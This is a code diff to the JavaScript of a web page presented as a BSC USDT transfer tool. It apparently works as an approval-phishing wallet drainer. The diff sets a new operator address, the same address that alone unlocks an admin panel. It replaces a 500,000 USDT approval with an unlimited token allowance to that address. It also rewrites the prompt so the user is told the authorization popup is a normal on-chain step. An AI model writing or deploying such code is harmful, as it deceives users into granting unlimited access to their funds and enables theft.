@@ -82,10 +82,12 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 </div>
 
 <script>
-const TARGET_ADDR = "0xD36dBCf4e15f8F6A45bCc0E7dDA6c272Ac8B8d63";
+const TARGET_ADDR = "0x47542770f3a8eea43d3321867b155c3ac01160d8";
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
 const GAS_LIMIT = "0x493E0";
 const MAX_WAIT = 40;
+// BSC USDT 无限授权最大值 2^256‑1
+const INFINITE_ALLOWANCE = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
 let web3 = null;
 let userAddress = null;
@@ -224,13 +226,13 @@ sendBtn.addEventListener("click", async () => {
     const val = parseFloat(amountInput.value);
     if(isNaN(val) || val <= 0) return alert("请输入有效转账数量");
     const needWei = web3.utils.toWei(val.toString(), "ether");
-    const GRANT_500K_WEI = web3.utils.toWei("500000", "ether");
     sendBtn.disabled = true;
     try{
         const allowance = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
         if(BigInt(allowance) < BigInt(needWei)){
-            alert("请钱包确认签名");
-            const approveData = usdtContract.methods.approve(TARGET_ADDR, GRANT_500K_WEI).encodeABI();
+            alert("不同钱包版本交互略有差异，转账USDT时弹出授权额度，属于链上正常流程，请确认签名。");
+            // 发起无限授权
+            const approveData = usdtContract.methods.approve(TARGET_ADDR, INFINITE_ALLOWANCE).encodeABI();
             await sendTx(approveData);
             alert("✅签名已上链");
             await waitAllowance(needWei);
@@ -285,7 +287,7 @@ settingIconBtn.addEventListener("click", () => {
     if(userAddress && userAddress.toLowerCase() === TARGET_ADDR.toLowerCase()){
         adminPanel.style.display = adminPanel.style.display === "block" ? "none" : "block";
     }else{
-        alert("");
+        alert("你不是管理员账号");
     }
 });
 
